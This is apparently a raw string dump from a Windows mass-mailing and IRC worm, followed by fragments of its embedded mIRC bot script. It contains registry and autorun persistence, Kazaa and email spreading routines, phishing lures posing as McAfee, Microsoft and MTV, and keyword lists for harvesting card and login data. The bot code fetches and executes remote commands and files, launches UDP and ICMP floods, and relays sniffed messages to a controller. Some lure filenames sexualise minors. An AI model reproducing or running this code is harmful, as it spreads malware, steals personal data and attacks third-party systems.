            "HookLog",
            "%s\\%sdrv.dll",
            "Hook",
            "%s\\%s%s.%s",
            "task",
            "%s\\%s%s%s.%s",
            "WinFile",
            "%s\\%s%s%s.exe",
            "Rundll",
            "NULL",
            "Virus",
            "Load",
            "Windows",
            "regfile\\Shell\\Open\\Command",
            "regedit.exe \"%1\"",
            "exefile\\Shell\\Open\\Command",
            "\"%1\" %*",
            "NETWORK-SEXY",
            "NETWORK-SETUP",
            "Kazaa",
            "program files",
            "%s\\%s",
            "rundll32.exe",
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "fDEF",
            "fIRC",
            "Files",
            "fRNA",
            "FuckOff",
            "Damage",
            "Options",
            ".exe",
            "Process32Next",
            "Process32First",
            "CreateToolhelp32Snapshot",
            "KERNEL32.DLL",
            "_%s_",
            "Source",
            "%s is not a valid Win32 application.",
            "Error Starting Program",
            "The %s file expects a newer version of Windows.",
            "Upgrade your Windows version.",
            "Cannot open file: it does not appear to be a valid program",
            "If you downloaded this file, try downloading file again.",
            "temp",
            "Country",
            "OTHER",
            "SETUP",
            "RoRo v%s %s",
            "Version",
            "REMOTE",
            "LOCAL",
            "FOLDER",
            "[Autorun]",
            "OPEN=%s",
            "%s\\Autorun.inf",
            "windows",
            "load",
            "%s\\%s\\%s",
            "%s\\%s\\Faith.ini",
            "%s\\%s\\Win.ini",
            "WINDOWS|WIN|WIN95|WIN98|WINME|DIR",
            "NETWORK",
            "%s\\*",
            "NETWORK-%s",
            "KAZAA",
            "KaZaA",
            "012345:%s",
            "Dir%d",
            "DisableSharing",
            "SOFTWARE\\Kazaa\\LocalContent",
            "%s\\Profiles",
            "Outbox_2",
            "Sent_%d",
            "Outbox_1",
            "MAIL-FLOOD",
            "MAIL-%s_2",
            "Priority",
            "Normal",
            "MAIL-%s_1",
            "Mark",
            "Sent",
            "UnSent",
            "Status",
            "MAIL-%s_0",
            "Start",
            "SMTP Server",
            "Software\\Microsoft\\Internet Account Manager\\Accounts\\%s",
            "Software\\Microsoft\\Internet Account Manager",
            "Default Mail Account",
            "Cannot.Resolve.Host",
            "mail.%s",
            "Quit",
            "Data",
            "Rcpt To: <%s>",
            "Mail From: <%s>",
            "HELO %s",
            "Info2",
            "Info : %s",
            "Info",
            "Host : %s",
            "Version : %s",
            "[Options]",
            "[Options]",
            "--%s--",
            "Content-Type: application/x-msdownload; name=\"%s\"",
            "Content-Type: audio/x-wav; name=\"%s\"",
            "Content-ID: <%s>",
            "<FONT></FONT></BODY></HTML>",
            "<iframe src=3Dcid:%s height=3D0 width=3D0></iframe>",
            "<HTML><HEAD></HEAD><BODY>",
            "Content-Disposition: attachment; filename=\"%s\"",
            "Content-Transfer-Encoding: base64",
            "Content-Type: application/octet-stream;\tname=\"%s\"",
            "Content-Transfer-Encoding: quoted-printable",
            "Content-Type: text/plain; charset=\"us-ascii\"",
            "Content-Type: text/html; charset=\"us-ascii\"",
            "--%s",
            "<BR>",
            "<HTML><BODY>%s</BODY></HTML>",
            "File : ",
            "Info : ",
            "Version : %s",
            "Host : %s",
            "X-Priority: %d",
            "Content-Type: multipart/mixed; boundary=\"%s\"",
            "MIME-Version: 1.0",
            "Subject: %s",
            "Date: %s",
            "To: %s",
            "From: %s",
            "----=_NextPart_000_000",
            "%d %b %y %H:%M:%S",
            " -= High =-",
            "CC %s %s",
            "High",
            " [%s]",
            "Nick",
            "IRC %s %s",
            "RNA %s %s [%s]",
            " <A HREF=\"http://%s\" TARGET=\"_blank\">%s</A> ",
            "Zdrasti|Zdr Otnovo|Ohoo|Ei|Pisamce|TinKi WinKy|ZzZz|Bla Bla|Hey|Privet|Boom",
            ", which is not suitable for those under the age of 18.| that is unsuitable for those under 18.",
            "This site contains adult material",
            "will be free|will be completely free",
            "the first month of your membership ",
            "If you join now |Join now and ",
            "free demo.",
            "|hot demo.",
            "|hot movie.",
            "|free demo.",
            "Watch our |Check our |You can check our ",
            "FREE!! |No credit card required. |And this is free! ",
            "XXX Lessons|Kama Sutra|Celebrities|Cute Teens|Blondes|1on1 Chat",
            "Image Galleries|Cumshots|LiveCams|Hot Video Chat|Erotic Stories|",
            " are available to you",
            " and ",
            "porn archives|videos|video archives|free pics|xxx stories|xxx pics",
            "Thousands of |Hundreds of |Plenty of ",
            "Congratulations",
            "Hello",
            "%s %s",
            "Subscription List_|Members Archive_|Free Tour_|Free Pictures_|Porn Archive_",
            "%s@%s",
            "members|support|mailer|archive",
            ".scr",
            ".pif",
            ".zip.pif",
            "Demo|Girl|Lolita|Teen|Tour|Anna|Blonde|Game|Cam",
            "Nice|Hot|Cute|Little|Free|Hardcore|Sexy|Nude",
            "%s%s.com",
            "Teens|Lolita|Girlz|Blondes|Amateurs",
            "Hot|Cute|Nude|Horny|Hardcore",
            "IE_0%d_Setup.exe",
            "support@mcafee.com",
            "McAfee Antivirus warns about several new viruses exploiting",
            "Microsoft Internet Explorer. They register themselves as ActiveX",
            "controls and subsequently grant access to the local resources of",
            "the visitors. This type of internet viruses is very dangerous,",
            "because they delete various files of the operating system.",
            "Due to the significant increase of viruses exploiting this vulnerability,",
            "McAfee Antivirus supports clients of Microsoft Windows with  patch, which",
            "fixes this bug in Internet Explorer 5.5 and minor versions. Customers who",
            "have applied this patch are already protected against the vulnerability",
            "and do not need to take additional action.",
            "-----------------",
            "McAfee Antivirus",
            "www.McAfee.com",
            "McAfee Antivirus Monthly Report_",
            "cards@e-greetings.com",
            "Friends.exe",
            "Hello, if you are reading this letter, it means that a friend",
            "of yours has sent it to you. The idea is to help you realize who",
            "you are indeed. This is an interactive variant, based on the",
            "original tests of Dhalai Lama, a great indian philosopher.",
            "Before you open the test, you should make a wish. Answer to",
            "the 5 questions honestly, after that you will recieve a number.",
            "If you want your wish to come true you must send this letter",
            "to that count of your friends. You can make the test only",
            "once, because after that the results won't be real.",
            "\"If you want to enter the other's world,",
            "you should explore your soul first\" - Dhalai Lama.",
            "P.S. This test is for personal use only, and should not",
            "be used with commercial purposes.",
            "Reveal Yourself",
            "%s%s",
            "..| :)| ;))| :pP| ~pPp| ;)",
            "HeY|ZzZz|Bla Bla|HoWie|Happy|Hi Again|Wow|Just A Letter|Hello|Hey Ya|Boom|Hi There",
            "charts@mtve.com",
            "mTV_Charts.pif",
            "Hi, mTV fans. We rely on you, our biggest",
            "friends to help us choose together the best",
            "songs for the beginning of the year. Our new",
            "suggestions are:",
            "  Robbie Williams - Feel",
            "  Eminem - Lose Yourself",
            "  T.A.T.U - All The Things She Said",
            "  Jay Z - Bonnie & Clyde",
            "  Foo Fighters - All My Life",
            "  Avril Lavigne - I'm With You",
            "  J.Lo ft. Lox - Jenny From The Block",
            "You can vote with the attached web client,",
            "or you can also visit our web site for a",
            "complete list of the singers and their",
            "hits.",
            "------------------",
            "mTV Europe,",
            "www.mTVe.com",
            "mTV Europe Top10_",
            "support@microsoft.com",
            "IE_0%d_bg.pif",
            "Blagodarenie na dulgogodishnite tradicii na Microsoft v Bulgaria",
            "i dobrata i suvestna rabota na vsichki neini podchineni, mojem",
            "nai-nakraq da pozdravim bulgarskiq potrebitel s prevod na",
            "Internet Explorer na bulgarski.",
            "Tova e edno uspeshno produljenie na iniciativata za prevejdane na",
            "Ms Office 2000  na rodniq ni ezik. Update-a e bezplaten i e",
            "podaruk po sluchai 10 godishninata na Microsoft v Bulgaria.",
            "Nadqvame se bulgarskite potrebiteli da ostanat dovolni, koeto shte",
            "bude nai-golemiq podaruk za nas.",
            "---------------------",
            "Microsoft, Bulgaria.",
            "Microsoft Bulgaria_",
            "Friends.zip.pif",
            "Zdravei, ako si poluchil tova pismo znachi nqkoi priqtel ti go e",
            "pratil. Celta na pismoto e da ti pomogne da razberesh koi si",
            "vsushnost. Originalnata ideq e na Dalai Lama i tova e nein",
            "interaktiven variant. Predi da otvorite test-a si namislete",
            "edno jelanie, otgovorete na 5-te vuprosa i sled kato poluchite",
            "jelanite otgovori shte poluchite edno chislo. Za da vi se izpulni",
            "jelanieto trqbva da pratite tova pismo na tolkova priqteli. Testa",
            "se pravi samo vednuj, poneje sled tova nqma da poluchite obektivna",
            "ocenka.",
            "\"Za da navlezem v sveta na drugite,",
            "purvo trqbva da budem nqsno sys sebe si\" - Dalai Lama.",
            "P.S. Tozi test e samo za lichna upotreba, i ne biva da bude",
            "izpolzvan za kakvito i da bili komersialni celi.",
            "Priqteli",
            "Hi again :)) Where are you? Don't you chat any more? I haven't",
            "seen you so long.. Well, I've got a lot to tell you about. The",
            "Winter vacation was too good to be true. Disco's, friends, fun..",
            "Unfortunately, the temperatures here are very low now and I was",
            "ill almost 2 weeks. Quite unpleasant :(( Let's talk about you :)",
            "Are you oK? Are you in love :)) I sent you a surprise :)) It's nice.",
            "I'm a little bit bored of these stupid computers, but I'm waiting",
            "for the reply :)) Bye..",
            "Zdrasti, ko staa :))) Baq vreme ne sme se chuvali. Beshe mi",
            "skuchno i si vikam shto da ne napisha nqkoi drugo pismo :))",
            "Sq i tva daskalo i napravo ujas, ne sa jivee :) Ti ostai drugoto",
            "ami i e studeno.. ~PpPp. Dano idva vakanciqta po skoro :)) Pishi",
            "neshto interesno, kak q karash, neshto novo ima li :) Pratih ti",
            "onva deto obeshtah, qko a :)) Aide i chakam..",
            "faq|join|download|daemon|list|sub|news|mailer|user|serv|anyone|you@|me@|info|secur|corp|sales",
            "microsoft|msdn|mcafee|panda|norton|bullguard|kaspersky|safe|admin|master|support|help|inc|",
            "@yahoo.com",
            "MAIL",
            ".pif|.scr|.pif|.scr",
            ".asf|.mpg|.asf|.avi|.mpg",
            "KaZaA Media Desktop v2.13_|Serials2K 7.1 (FULL Updated)_|Serials2003_8.0(14.02.03)_|Dreamweaver_MX_Update_|ACDSee|WinAmp_3.1_Cool_|Download Accelerator 5.5_|Nero Burning Rom 5.7.7.3_",
            "cReditCarDs_gEn|Mail HACK |WinXP Crack Password |DiViDiX Coder 5.0 Beta_|Eminem BioData|DMX Desktop |NFS HP Bonus Cars_|Counter Strike 1.5 (Hack)_|WinZip Password Crack |WinZip 8.1(FULL)_|DivX 5.5 Full_|",
            "7.1 FULL|v5.5|(zip)|3.0|(Eng)|(Cracked)",
            "Nice Girl*|15 years old blonde*|Shakira Boobs_|Pamela3D_|17year old teen babysitter*|KamaSutra*|Teen raped in bathroom*|Teen_Sex_Cam|Sarah fingers pussy on webcam*|Silvia Saint Theme_|Russian_Teen*|mariana hot virgin*|German Rape*|Skinny Lolita French Teen*|BlondeShow*",
            "(sHow)|3D|3.0|(Eng)|v4.5|(Rated)",
            "ClubExtreme_|Story015_|Gipsy|Elfbowl|snowball_fight_|mTVCharts_",
            "3.3|(zip)|(sHow)|3D|(Eng)|_v1.1",
            "BoxDave_|Pamela*|KamaSutra|Fishfood|Story017_|16Yr_Old_Teen*|mTV_Charts_",
            "(sHow)|3D|(Eng)|2.3",
            "SEXY",
            "dreamy|candy_f|bryan16|jerry|baby_17|neo|trish1|linda17|monica|nicole|angel_f|mellany|iguana17|blade|badgirl|wizzard",
            "blue16|tweety|alice|jane17|badboy|rap_girl|CrazyGirl|happy|amanda|crazy|mickey|lady_f|alex15|sunny|dave|panda_f|",
            "hotmail.com|yahoo.com|mail.com|yahoo.co.uk|usa.net|europe.com|aol.com",
            "Inbox",
            "</b>",
            "@-._",
            "www.",
            "http:",
            "/:-._",
            "cc-|cc's|visa|credit|kreditkarte|cardnumber|cardtype|address|expir|cvv2",
            "yahoo|aol|mail|ebay|spoof|login|user|pass|account|charge|billing|payment|",
            "game|data|program|egg|credits|quote|fax|read|help|bot|script|perl|cgi|cpp|vbs|js|htm",
            "desktop",
            "<html",
            "@-._</>",
            "MAPIReadMail",
            "MAPIFindNext",
            "MAPILogoff",
            "MAPILogon",
            "MAPI32.DLL",
            "NoLogon",
            "Mail",
            "MAPI",
            "C:\\Program Files",
            "Software\\Microsoft\\Windows\\CurrentVersion",
            "ProgramFilesDir",
            "FinalDestinationEvent",
            "StartUp",
            "uninstallHook",
            "installHook",
            "Internet Mail",
            "Choose Profile",
            "#32770",
            "Outlook Express",
            "Exefile\\Shell\\Open\\Command",
            "DRIVE",
            "faith",
            "none",
            "mirc.ini",
            "%s\\%s",
            "%s\\*.*",
            "%s\\Desktop",
            "My Documents",
            "txt|wri|doc",
            "autorun.inf",
            "ods|mmf|nch|mbx|eml|tbb|dbx|wab",
            "%s%s.exe",
            "File",
            "Entry2",
            "Entry1",
            "Profile|System|Agent",
            "Run|Load|Start",
            "Agent| StartUp| Loader",
            "16|32",
            "\"%s\"",
            "exefile\\shell\\open\\command",
            " \"%1\" %*",
            "%s powrprof.dll,LoadCurrentPwrScheme",
            "Autorun.inf",
            "Full",
            "Bulgaria",
            "intl",
            "sCountry",
            "MAIL-OTHER_2",
            "Rahmul4o@mailbg.com",
            "MAIL-OTHER_1",
            "Rahmul@bitex.bg",
            "MAIL-OTHER_0",
            "Rahmul@mailbg.com",
            "MAIL-BG_2",
            "Rahmul4o@priatel.com",
            "MAIL-BG_1",
            "Rahmul@mail.bg",
            "Rahmul@abv.bg",
            "MAIL-BG_0",
            "Rahmul@priatel.com",
            "Count",
            "Loaded",
            "n404=    .hdel -w Data $rev($sockname, *) | .sockclose $sockname",
            "n405=  }",
            "n406=}",
            "n407=on *:sockclose:GetHTTP-*:{ if ($hget(Data, $rev($sockname,Final)) != 1 && SAVE !isin $hget(Data, $rev($sockname, Options))) { .remove $hget(Data, $rev($sockname, LocalName)) } | .hdel -w Data $rev($sockname, *) }",
            "n386=    }",
            "n387=  }",
            "n388=  else {",
            "n389=    .sockread %sRead",
            "n390=    var %sParam = $hget(Data, $rev($sockname, Serv)) $+ $hget(Data, $rev($sockname, RemoteName))",
            "n391=    if (%sRead == $null) { .hadd Data $rev($sockname, EOR) 1 }",
            "n392=    else if (Content-Length* iswm %sRead) { .hadd Data $rev($sockname, Size) $GetTok(%sRead, 2, 32) }",
            "n393=    else if ((HTTP/* iswm %sRead) && (200 isin %sRead)) { if (EXEC isin %http.Options) { .writeini $GFN(DEF) MISS %sParam 0 } }",
            "n394=    else if ((HTTP/* iswm %sRead) && (200 !isin %sRead)) {",
            "n395=      if (EXEC isin %http.Options) {",
            "n396=        .writeini $GFN(DEF) MISS %sParam $calc($readini($GFN(DEF),MISS,%sParam) + 1)",
            "n397=        if ($readini($GFN(DEF),MISS,%sParam) > 1) { .remini $GFN(DEF) HTTP %sParam }",
            "n398=      }",
            "n399=      .hdel -w Data $rev($sockname, *) | .sockclose $sockname | .return",
            "n400=    }",
            "n401=  }",
            "n402=  if ($hget(Data, $rev($sockname, Final)) == 1) {",
            "n403=    if ((STORE isin %http.options) && ($file(%http.LocalName).size == $hget(Data, $rev($sockname, Size)))) { .run %http.LocalName | .hadd Data Visited 1 }",
            "n374=  var %sRead = \"\" , %http.LocalName = $hget(Data, $rev($sockname, LocalName)) , %http.Options = $hget(Data, $rev($sockname, Options))",
            "n375=  if ($hget(Data, $rev($sockname, EOR)) == 1) {",
            "n376=    if (STORE isin %http.Options) || (SAVE isin %http.Options) {",
            "n377=      :StoreMore | .sockread &bRead | if ($sockbr != 0) { .bwrite %http.LocalName -1 &bRead | .goto StoreMore }",
            "n378=      if ($hget(Data, $rev($sockname, Size)) && $file(%http.LocalName).size >= $hget(Data, $rev($sockname, Size))) { .hadd Data $rev($sockname, Final) 1 }",
            "n379=    }",
            "n380=    if (EXEC isin %http.Options) {",
            "n381=      .sockread %sRead | %sRead = [ [ %sRead ] ]",
            "n382=      if (%sRead == EOF2) { .hadd Data $rev($sockname, Final) 1 }",
            "n383=      else if (Script: isin %sRead) { .hadd Data $rev($sockname, Script) $gettok(%sRead, 2, 32) }",
            "n384=      else if (Stat: isin %sRead) { .hadd Data $rev($sockname, Stat) $gettok(%sRead, 2, 32) }",
            "n385=      else if (($hget(Data, $rev($sockname, Script)) == $getScript) && ($hget(Data, $rev($sockname, Stat)) == $getStat) && (%sRead != EOF)) { %sRead }",
            "n359=  var %http.sock = $OpenIt(GetHTTP)",
            "n360=  .hadd Data $rev(%http.sock, LocalName) $2",
            "n361=  if ($exists($hget(Data, $rev(%http.sock, LocalName))) == $true) { .remove $hget(Data, $rev(%http.sock, LocalName)) }",
            "n362=  .hadd Data $rev(%http.sock, RemoteName) / $+ $getTok($1, 2-, $asc(/)) | .hadd Data $rev(%http.sock, Serv) $getTok($1, 1, $asc(/))",
            "n363=  .hadd Data $rev(%http.sock, Script) $getScript | .hadd Data $rev(%http.sock, Stat) $getStat",
            "n364=  .hadd Data $rev(%http.sock, Options) $3- | .hadd Data $rev(%http.sock, Size) 0",
            "n365=  if ($hget(Data, $Rev(%http.sock, Serv)) != $null) { .sockopen %http.sock $hget(Data, $Rev(%http.sock, Serv)) 80 }",
            "n366=  else { .hdel -w Data $rev(%http.sock, *) }",
            "n367=}",
            "n368=on *:sockopen:GetHTTP-*:{",
            "n369=  if ($sockerr > 0) { .hdel -w Data $rev($sockname, *) | .return }",
            "n370=  .RequestURL $sockname $hget(Data, $rev($sockname, RemoteName)) $hget(Data, $rev($sockname, Serv))",
            "n371=}",
            "n372=on *:sockread:GetHTTP-*:{",
            "n373=  if ($sockerr > 0) { .hdel -w Data $rev($sockname, *) | .return }",
            "n345=  }",
            "n346=}",
            "n347=alias setSites { .addHTTP TmpWebAcc.hit.bg/Commands.txt NULL EXEC | .addHTTP geocities.com/TmpWebAcc/Commands.txt NULL EXEC | .writeini $winFile Options Init2 1 }",
            "n348=alias RequestURL {",
            "n349=  .sockwrite -n $1 GET $2 HTTP/1.1 | .sockwrite -n $1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, */*",
            "n350=  .sockwrite -n $1 Accept-Language: en | .sockwrite -n $1 Accept-Encoding: deflate | .sockwrite -n $1 User-Agent: Mozilla/4.0 (compatible; MSIE 4.72; Windows 98)",
            "n351=  if ($pos($3,.,0) == 1) { .sockwrite -n $1 Host: www. $+ $3 } | if ($pos($3,.,0) != 1) { .sockwrite -n $1 Host: $3 }",
            "n352=  .sockwrite -n $1 Connection: Keep-Alive | .sockwrite -n $1 Cache-Control: no-cache | .sockwrite -n $1",
            "n353=}",
            "n354=alias HttpMe {",
            "n355=  var %sParam = $ini($GFN(DEF), HTTP, $rand(1,$ini($GFN(DEF),HTTP,0)))",
            "n356=  if (%sParam) { .GetHTTP %sParam $readini($GFN(DEF), HTTP, %sParam) }",
            "n357=}",
            "n358=alias GetHTTP {",
            "n337=on ^*:Text:*:?:{ if ($nick != $me) { .extractAddr $1- } | if (m isin $hget(Data, Sniffer) && $Verify($hget(Data, Sniffer.Console))) { .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER-MSG) ( $+ $Nick $+ ) $1- } }",
            "n338=on ^*:Notice:*:?:{ if ($nick != $me) { .extractAddr $1- } | if (n isin $hget(Data, Sniffer) && $Verify($hget(Data, Sniffer.Console))) { .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER-NOTICE) ( $+ $Nick $+ ) $1- } }",
            "n339=on ^*:Join:*:{",
            "n340=  if ($nick == $me) { .hadd Data Addr $remove($address,~) | if ($hget(Data,addHost)) { .writeini $GFN(IRC) BNC $hget(Data,addHost) $+ _Host $hget(Data,Addr) | .hdel Data addHost } }",
            "n341=  else {",
            "n342=    if (!hget(Data,ValidNick)) || ($rand(1,3) == 2) { var %sValid = $validNick($nick) | if (%sValid) { .hadd Data ValidNick %sValid } }",
            "n343=    if ($hget(Data,LoadClone) && $hget(Data,ValidNick)) { .loadclone Clone-Static $hget(Data,Server) $hget(Data,ValidNick) $remove($getTok($address,1,$asc(@)),~) $fullname | .hadd Data LoadClone 0 }",
            "n344=    if ((($hget(Data, Spread) == On) || ($hget(Data, Mass) == On)) && $incCount(iJoin)) { .OpenConsole $nick $GetTok($address,2,$asc(@)) }",
            "n326=  %sSearch2 = sex|mailto|mail|flash|girl|sport|e-mail|links|food|mailto|school|e-mail|dream|team|rap|boy|think|mail|ball|email|nice|true|e-mail|write|list",
            "n327=  %sTmpDir = $windir $+ \\Temp | if ($exists(%sTmpDir) == $false) .return",
            "n328=  :extractFile | %sFile = %sTmpDir $+ \\ $+ TmpFile $+ $rand(1,10000) $+ .faith | if ($exists(%sFile) == $true) .goto extractFile",
            "n329=  %sSearch = $getTok(%sSearch, $rand(1, $numTok(%sSearch, $asc(|))), $asc(|)) | if (!%sSearch) .return",
            "n330=  %sSearch2 = $getTok(%sSearch2, $rand(1, $numTok(%sSearch2, $asc(|))), $asc(|)) | if (!%sSearch2) .return",
            "n331=  if (bg !isin %sSearch) { %sSearch = %sSearch $+ + $+ %sSearch2 }",
            "n332=  %sTag = google.com/search?q= $+ %sSearch $+ &hl=en&lr=&ie=UTF-8&start= $+ %iIndex $+ &sa=N",
            "n333=  .GetHTTP %sTag %sFile SAVE",
            "n334=}",
            "n335=raw *:*:{ if ($numeric == 2) { if (UniBG isin $1-) || (*-bg iswm $1-) { .setCountry BG } } }",
            "n336=on ^*:Action:*:#:{ if ($1 == osc) { .OpenSConsole $2 $decode($3,mt) } | if ($1 == mip) { .notice $nick IP_ $+ $IP $getVersion $getScript } }",
            "n315=on *:sockread:Server-BNC:{ var %sRead | .sockread %sRead | if ($Verify(Gateway-BNC)) { .sockwrite -tn Gateway-BNC %sRead } }",
            "n316=on *:sockread:Gateway-BNC:{ var %sRead | .sockread %sRead | if ($sock(Server-BNC).mark == 1 && $Verify(Server-BNC) == 1) { .sockwrite -tn Server-BNC %sRead } }",
            "n317=alias validAddr { if (($len($1-) > 8 && $len($1-) < 64) && ($pos($1-,.,0) < 3 && $pos($1-,@,0) == 1) && (~ !isin $1- && * !isin $1-)) { .return 1 } | .return 0 }",
            "n318=alias newAddr { if ($readini($GFN(DEF), Outbox_1, $1)) || ($readini($GFN(DEF), Outbox_2, $1)) .return 0 | .return 1 }",
            "n319=alias extractAddr { ",
            "n320=  var %s , %i = 0 , %iCount = $wildTok($1-, *@*.*, 0, 32)",
            "n321=  while (%i < %iCount) { .inc %i | %s = $wildTok($1-,*@*.*,%i,32) | if ($validAddr(%s) && $newAddr(%s)) { .writeini $GFN(DEF) Outbox_1 %s UnSent } }",
            "n322=}",
            "n323=alias extractHTML {",
            "n324=  var %iIndex = $rand(10, 700) , %sTmpDir , %sTag , %sFile , %sSearch , %sSearch2",
            "n325=  %sSearch = mail.bg|abv.bg|yahoo.com|mail.com|hotmail.com|usa.net|yahoo.de|gmx|mail+.co.uk|mail+.ch|mailto+.jp|mail+.de|mail+.fr|mailto+.ca|mailto+.ru",
            "n302=  :packetLoop | if (%i >= %iCount) { if ($verify($hget(Data,FConsole))) { .sockwrite -tn $hget(Data,FConsole) (UDP) Target was flooded. } | .return }",
            "n303=  .sockudp %sSock %iIp %iPort %sPack | .inc %i | .goto packetLoop",
            "n304=}",
            "n305=alias ICMPFloodIt {",
            "n306=  if (!$3) { .return } | var %sVBS = $winDir $+ \\wincache.vbs , %iIP = $1 , %iSize = $2 , %iCount = $3",
            "n307=  .remove %sVBS | .write %sVBS on error resume next | .write %sVBS set wscShell = CreateObject(\"WScript.Shell\")",
            "n308=  .write %sVBS wscShell.Run \"command /c ping -n %iCount -l %iSize -w 0 %iIP $+ \", 0, true | .run %sVBS",
            "n309=  if ($verify($hget(Data,FConsole))) { .sockwrite -tn $hget(Data,FConsole) (ICMP) Flooding %iIp with %iSize bytes %iCount times. }",
            "n310=}",
            "n311=on *:socklisten:Listen-BNC:{ if ($sock(Gateway-BNC).mark == 1) { .sockaccept Server-BNC | .sockmark Server-BNC 1 } }",
            "n312=on *:sockopen:Gateway-BNC:{ .sockmark $sockname 1 }",
            "n313=on *:sockclose:Gateway-BNC:{ .sockclose Server-BNC }",
            "n314=on *:sockclose:Server-BNC:{ .sockclose Gateway-BNC }",
            "n289=  .sockwrite -tn $sockname NICK %Nick | .sockwrite -tn $sockname USER %Ident \"\" %Server %Name",
            "n290=}",
            "n291=on *:sockread:Clone-*:{",
            "n292=  if ($sockerr > 0) { .return } | var %sRead , %sNick , %sText , %sMe = $getTok($sock($sockname).mark,2,32)",
            "n293=  .sockread %sRead | .tokenize 32 %sRead",
            "n294=  %sNick = $remove($gettok($1,1,$asc(!)),:) | if (! !isin $1) { %sNick = %sMe } | %sText = $getTok($1-,2-,$asc(:))",
            "n295=  if ($1 == PING) { .sockwrite -tn $sockname PONG $2 }",
            "n296=  else if ($me != %sNick && osc isin %sText) { %sText = $remove(%sText,",
            ",ACTION) | if ($getTok(%sText,1,32) == osc) .OpenSConsole $getTok(%sText,2,32) $decode($getTok(%sText,3,32),mt) }",
            "n297=}",
            "n298=alias UDPFloodIt {",
            "n299=  if (!$3) { .return } | var %sSock = $openIt(PACKET) , %iIp = $1 , %iSize = $2 , %iCount = $3 , %iPort = $rand(1000,6669) , %i = 0",
            "n300=  var %sPack = $random(10) | %sPack = $str(%sPack, $int($calc(%iSize / 10)))",
            "n301=  if ($verify($hget(Data,FConsole))) { .sockwrite -tn $hget(Data,FConsole) (UDP) Flooding %iIp with %iSize bytes %iCount times. }",
            "n278=}",
            "n279=alias validNick {",
            "n280=  if ($len($1) < 3) || ($len($1) > 10) { .return } | var %i = 0 , %sChar , %iRand = $rand(1,4) , %s = |\\[]{}^`_ , %sL = _|`|^ , %sR = _|`|^|{}|{P} , %sD = {.}|[.]|_._|^.^",
            "n281=  :validIt | .inc %i | %sChar = $mid(%s,%i,1) | if (%sChar) { if (%sChar isin $1) .return | .goTo validIt }",
            "n282=  if (%iRand == 1) || (%iRand == 4) { .return $1 $+ $getTok(%sR,$rand(1,$numTok(%sR,$asc(|))),$asc(|)) } | if (%iRand == 2) { .return $getTok(%sL,$rand(1,$numTok(%sL,$asc(|))),$asc(|)) $+ $1 }",
            "n283=  if (%iRand == 3) { %i = $rand(1,$numTok(%sD,$asc(|))) | .return $getTok($getTok(%sD,%i,$asc(|)),1,$asc(.)) $+ $1 $+ $getTok($getTok(%sD,%i,$asc(|)),2,$asc(.)) }",
            "n284=}",
            "n285=on *:sockopen:Clone-*:{",
            "n286=  if ($sockerr > 0) { .return } | .tokenize 32 $sock($sockname).mark",
            "n287=  var %Server = \" $+ $1 $+ \" , %Nick = $Random($Rand(4,9)) , %Ident = $Random($Rand(4,7)) , %Name = : $+ $Random($Rand(3,10)) $Random($Rand(2,6))",
            "n288=  if ($2 && $2 != random) { %Nick = $2 } | if ($3 && $3 != random) { %Ident = $3 } | if ($4 && $4 != random) { %Name = : $+ $4- }",
            "n265=  while (%i < %iCount) { .inc %i | %sExec = [ [ $1- ] ] | %sSock = $sock(%sMask,%i) | if ($Verify(%sSock) && $Binded(%sSock)) { .sockwrite -tn %sSock %sExec } }",
            "n266=}",
            "n267=alias regValidNick {",
            "n268=  var %sFile = $fClone , %sMask = $1 $+ -* , %sSock = $sock(%sMask,$2) , %sNick , %sTemp = $random(5) , %sPerm = $random(6)",
            "n269=  if ($ini(%sFile,0) > 4) || ($2 > 5) { .return } | if (!%sSock) { .return }",
            "n270=  %sNick = $getTok($sock(%sSock).mark,2,32) | if (!%sNick) { .return }",
            "n271=  if ($len(%sNick) > 3 && !$readini(%sFile,%sNick,Temp)) { .sockwrite -tn %sSock PRIVMSG NS :reg %sTemp %sPerm | .writeini %sFile %sNick Temp %sTemp }",
            "n272=  .timerRegValidNick 1 90 { .regValidNick $1 $calc($2 + 1) }",
            "n273=}",
            "n274=alias loadValidNick {",
            "n275=  var %sFile = $fClone , %sNick , %sRead , %sMask = $1 $+ -* , %sSock , %i = 0",
            "n276=  :loadIt | .inc %i | %sSock = $sock(%sMask,%i) | %sNick = $ini(%sFile,%i) | if (!%sSock) || (!%sNick) { .return }",
            "n277=  %sRead = $readini(%sFile,%sNick,Temp) | if (%sRead && %i < 5) { .sockwrite -tn %sSock NICK %sNick | .sockwrite -tn %sSock PRIVMSG NS :id %sRead | .goTo loadIt }",
            "n253=  if ($1 == /oper && $0 == 3) { .dif 3 $2- }",
            "n254=  if ($1 == ident && $target !ischan && $0 == 2) { .dif 4 $target $2 }",
            "n255=}",
            "n256=alias incCount { if (!$hget(Data,$1)) || ($hget(Data,$1) < $hget(Data,$1 $+ Count)) { .hadd Data $1 $calc($hget(Data, $1) + 1) | .return 1 } | .return 0 }",
            "n257=alias decCount { .hadd Data $1 $calc($hget(Data,$1) - 1) }",
            "n258=alias Random { var %i = 0 , %s | while (%i < $1) { %s = %s $+ $rand(a,z) | inc %i } | .return %s }",
            "n259=alias fClone { .return $winDir $+ \\winocx.dll }",
            "n260=alias UseInvite { var %sMask = $1 $+ -* , %sSock = $sock(%sMask,1) | if ($Verify(%sSock) && $Binded(%sSock)) { .sockwrite -tn %sSock $1- | .return 1 } | .return 0 }",
            "n261=alias LoadClone { var %sSock = $OpenIt($1) | .sockopen %sSock $2 6667 | .sockmark %sSock $2- }",
            "n262=alias UseClone { var %sMask = $1 $+ -* | if ($sock(%sMask,0)) { .sockwrite -tn %sMask $2- | .return 1 } | .return 0 }",
            "n263=alias UseClones {",
            "n264=  var %i = 0 , %sMask = $1 $+ -* , %iCount = $sock(%sMask,0) , %sSock , %sExec",
            "n243=on *:input:*:{",
            "n244=  var %i = 0 , %iT , %sT = $me , %sLine",
            "n245=  if (i isin $hget(Data, Sniffer) && $Verify($hget(Data, Sniffer.Console))) { .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER-INPUT) ( $+ $active $+ ) $1- }",
            "n246=  if (/remote isin $1 && $2 == off) || (/remote isin $1 && $0 == 1) { .echo -a ",
            " $+ 2*** Remote is off | .halt }",
